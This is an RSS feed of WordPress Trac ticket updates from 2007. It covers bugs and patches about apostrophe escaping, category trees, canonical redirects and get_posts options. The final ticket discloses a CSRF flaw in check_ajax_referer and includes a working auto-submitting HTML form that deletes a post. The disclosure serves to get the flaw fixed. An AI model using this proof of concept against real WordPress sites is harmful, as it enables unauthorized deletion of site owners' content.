item.title: Ticket #4949 (Strange Bug with apostrophes and the title of a webblog) updated
item.dc:creator: Stevie212
item.description:
Priority, Severity changed

Also, this doesn't seem to happen in 2.3 Beta 2m but since the 2.2 branch is still of importance for now, this should be investigated and fixed.

item.title: Ticket #4949 (Strange Bug with apostrophes and the title of a webblog) updated
item.dc:creator: Stevie212
item.description:
Also, this did not happen in WP 2.2.2 or 2.2.1 or even 2.2.

To note also, in previous versions, only when you make a fresh install of WP and use an apostrophe it will have the backslash, but it seems that in 2.2.3, if you modify it it does the same thing.

item.title: bug_title.PNG attached to Ticket #4949
item.dc:creator: Stevie212
item.description: After saving the options to modify the title, if an apostrophe is used anywhere, WP automatically ads a backslash before the apostrophe, which is really annoying.

item.title: Ticket #4949 (Strange Bug with apostrophes and the title of a webblog) created
item.dc:creator: Stevie212
item.description:
It seems that when I add an apostrophe to the title like "WordPress's Blog" etc, the after result when saved, shows that WP automatically ads a backslash before the apostrophe in the title, which is NOT supposed to happen, its pretty easy to re-create the problem, and in this case it's WordPress 2.2.3.

This should be fixed right away, perhaps a 2.2.4 release. Or better yet, in 2.3.

I added a screenshot to show you what I mean, and if you don't beleive me, do it yourself and you'll see what I mean. And strangely this sort of happens in previous WordPresses.

item.title: Ticket #4948 (Category Parent/Child Tree) created
item.dc:creator: iacas
item.description:
Short of building my own recursive function, I'd like WordPress to support a method to get a parent/child category ID tree. One function (get_category_parents) already does this except with the names of the categories. Another function, cat_is_ancestor_of in category.php appears to be usable, but I've been unable to get it to work.

In short, I'm trying to solve the problem of figuring out what top-most parent category a blog entry belongs to so that I can do some various things with CSS, sidebars, etc.

​http://nslog.com/2007/09/09/wordpress_category_parents

item.title: Ticket #4803 (WordPress should be inserting its generator tag via the wp_head hook) updated
item.dc:creator: Otto42
item.description:
Matt Cutts argued for removing the generator tag entirely at WordCamp 2007. See here (Powerpoint presentation, slide 27 of 28): ​http://www.mattcutts.com/files/Whitehat-SEO-tips-for-bloggers.ppt

Two thoughts:

  1. Are we actually getting any relevant or useful stats out of this? If not, then it should go away entirely, as it's useless.
  1. Is the version number really necessary? If we get stats that pertain to installed base, wouldn't just content='WordPress' be enough, instead of including the version as well?

-1 on moving it to core without some debate on eliminating it entirely.

item.description:

` if ( isset($to_ping) )

$to_ping = preg_replace('|\s+|', "\n", $to_ping);

else

$to_ping = ;

`

...is duplicated in the wp_insert_attachment function. Line numbers 1345 and 1363.

Accidental copy/paste, or is there a reason for this that is cleverer than my current ability to fathom?

item.description: Where is your site?

item.title: Ticket #4773 (Canonical URL addition causes redirection problems) updated
item.dc:creator: wantmoore
item.description:
Replying to markjaquith:

wantmore,

What are your symptoms?

Also, see if this fixed it: [6068] -- it's not related to Canonical URLs, but it is related to PATHINFO URLs and "show page on front page"

I just updated to r6070 and am still having the infinite redirect problem. With Firefox I get: 

The page isn't redirecting properly
      Firefox has detected that the server is redirecting the request for this address in a way that will never complete.
    *   This problem can sometimes be caused by disabling or refusing to accept
          cookies.

It works exactly as expected when I comment out the add_action line in wp-includes/canonical.php

item.dc:creator: markjaquith
item.description:

Permalink structure:

/index.php/%year%/%monthnum%/%day%/%postname%/

Showing a page on the front of the site, blog on a "blog" subpage.

If I go to /index.php/blog/ and mouse over the "Older Entries" link, it shows:

[redacted]/index.php/index.php/blog/page/2/

item.title: get_posts_category_list_and_exclusion.diff attached to Ticket #4943
item.dc:creator: johnjosephbachir

item.title: Ticket #4943 (Add features to get_posts: select from multiple categories, or exclude ...) created
item.dc:creator: johnjosephbachir
item.description:
This patch adds two features to get_posts(), while maintain backward compatibility with all previous invocations:

  • The category variable may be a comma-separated list, specifying selection of posts from multiple categories. 
    get_posts('numberposts=5&category=1,5,6'); // get the 5 most recent posts from categories 1,5, and 6 (singular still works as before)
  • The query may be inverted, so that the results are from any categories BUT the ones specified. 
    get_posts('numberposts=5&category=3,4&category_exclude=1'); // get the 5 most recent posts from all categories other than categories 3 and 4 (singular also works)

I haven't thoroughly tested this code, it's more for discussion purposes at this point. But I'm fairly confident that it's a complete solution.

(btw-- there is no 2.2.3 yet in the trac version menu)

item.title: Ticket #4941 (Collating terms with custom slugs) created
item.dc:creator: ryan
item.description:
See discussion here:

​http://comox.textdrive.com/pipermail/wp-testers/2007-September/005095.html

A category with a custom slug (a slug that does not match the sanitized form of the category name) does not map to the same term as a tag of the same name. It seems a reasonable expectation that the tag would map to the same term as a category of the same name.

Further, a tag named "Foo" maps to a category named "Foo Bar" if "Foo Bar" has a custom slug of "foo". In this case, perhaps "Foo" should be given a new term with a slug of foo-2 instead of sharing a term with a category that has a different name.

Also, since a post's tags are saved by name instead of term ID, tags can bounce to different terms if slugs are changed.

item.title: Ticket #4940 (Blogroll / Add link - layout options "Link Relationship" and ...) created
item.dc:creator: sircuri
item.description:
The draggable and expandable options "Advanced" and "Link Relationship (XFN)" on the Add Link page (Bloggroll menu) are moving around the screen when expanded or collapsed. When clicking on the plus-sign near the "Link Relationship" option, the content is expanded below the option "Advanced" instead of directly below "Link Relationship". Expanding both options and collapsing the first one again, causes the "advanced" option to move completely to the bottom of the page. You have to manually drag it back to the original location.

Client: Windows Vista / IE 7.0 Webserver: Linux / PHP 5.4.2 / Apache

Judging from the output, I'm guessing something is corrupt with your wp-settings.php file. You may also want to verify that compat.php and wp-db.php are okay as well.

But it's almost certainly a bad upload, not a WordPress issue.

item.title: pluggable.diff attached to Ticket #4939
item.dc:creator: xknown
item.description: Set current user in check_ajax_referer.

item.title: Ticket #4939 (check_ajax_referer does not protect from CSRF at all) created
item.dc:creator: xknown
item.description:
check_ajax_referer only checks if the incoming request contains valid user credentials but wp_get_current_user still uses WP cookies to determine the current user, so anyone with a subscriber role (or another role) can perform CSRF attacks. 

<html>
<body>
	<form method="post" action="http://localhost/wp/wp-admin/admin-ajax.php">
		<input type="text" name="action" value="delete-post" />
		<input type="text" name="id" value="Post_ID" />
		<input type="text" name="cookie" value="wordpressuser_sitehash=subscriber; wordpresspass_sitehash=password" />
	</form>
	<script>document.forms[0].submit();</script>
</body>
</html>
